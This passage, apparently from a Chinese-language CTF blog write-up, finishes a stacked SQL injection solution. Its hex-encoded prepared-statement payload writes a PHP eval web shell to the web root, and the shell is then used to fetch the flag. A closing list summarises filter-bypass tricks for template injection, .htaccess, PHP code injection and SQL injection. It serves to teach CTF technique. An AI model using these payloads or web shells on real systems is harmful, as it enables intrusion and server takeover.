+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;; prepare execsql from 0x73656c656374202a2066726f6d20603078446b746260;execute execsql;</span><br></pre></td></tr></table></figure>
+<p>发现可以执行成功，那么直接写shell<code>select '&lt;?php @eval($_POST[ccc]);?&gt;' into outfile '/var/www/html/shell.php'</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;; prepare execsql from 0x73656c65637420273c3f70687020406576616c28245f504f53545b6363635d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f7368656c6c2e70687027;execute execsql;</span><br></pre></td></tr></table></figure>
+<p>用蚁剑连接拿flag。</p>
+<h2 id="赛后收获">赛后收获</h2>
+<ul>
+<li>flask模板注入过滤了关键字或者下划线可以用管道符+join的方式绕过；</li>
+<li><code>is_file()</code>函数的参数是一个数组的时候会返回一个NULL；</li>
+<li>.htaccess可以用换行的方式绕过关键字黑名单</li>
+<li>接上一条，如果过滤了<code>\</code>，在.htaccess中解析某个后缀为cgi文件，再上传一个cgi文件运行后读取flag；</li>
+<li>PHP复杂变量解析；</li>
+<li>PHP5.6以后版本有变长参数的特性；</li>
+<li>在代码注入的题目中还可以用这种方式写入shell：<code>$_GET[a](N,a,8);&amp;a=file_put_contents</code>，再用PHP伪协议读取；</li>
+<li>SQL注入预编译过了<code>set</code>，可以直接用<code>prepare execsql from 0x....</code></li>
+</ul>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+    <div id="disqus_thread"></div>
+    <script>
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://ca01h.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image 
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="c"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div> -->
+
+    <!-- Author title
+    <div class="author-title">
+      <div>ca01h</div>
+      <div>2020-11-19</div>
+    </div> -->
+	
+	<script src="https://www.hackthebox.eu/badge/212159"></script>
+  </div> 
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+	  <i class="fas fa-folder-open"></i>&nbsp;
+      <a class="category-link" href="/categories/CTF/">CTF</a>
+	  </br>
+	  <i class="fas fa-tags"></i>&nbsp;
+      <a class="tag-none-link" href="/tags/CTF/" rel="tag">#CTF</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+	  
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+<div align="center">
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">Copyright © ca01h 2019-2020 | 本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+<!-- <span class="post-meta-divider">|</span> -->
+<!-- <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span> -->
+</div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</body>
+</html>
+
+
+
+<script src="/js/book.js"></script>
